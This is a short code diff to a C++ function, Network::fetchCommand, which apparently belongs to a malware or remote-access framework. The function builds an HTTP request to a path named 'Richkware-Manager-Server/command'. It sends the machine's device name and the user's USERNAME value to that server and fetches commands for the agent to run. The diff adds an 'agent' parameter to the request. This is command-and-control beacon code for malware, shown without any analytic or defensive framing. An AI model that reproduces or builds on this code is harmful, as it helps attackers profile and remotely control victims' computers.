@@ -168,6 +168,7 @@ std::string Network::fetchCommand(const char *serverAddress, const char *port) {
     device.append(getenv("USERNAME"));
 
     std::string packet = "GET /Richkware-Manager-Server/command?data0=" + device +
+                         "&data1=agent" +
                          " HTTP/1.1\r\n" +
                          "Host: " + serverAddress + "\r\n" +
                          "Connection: close\r\n" +
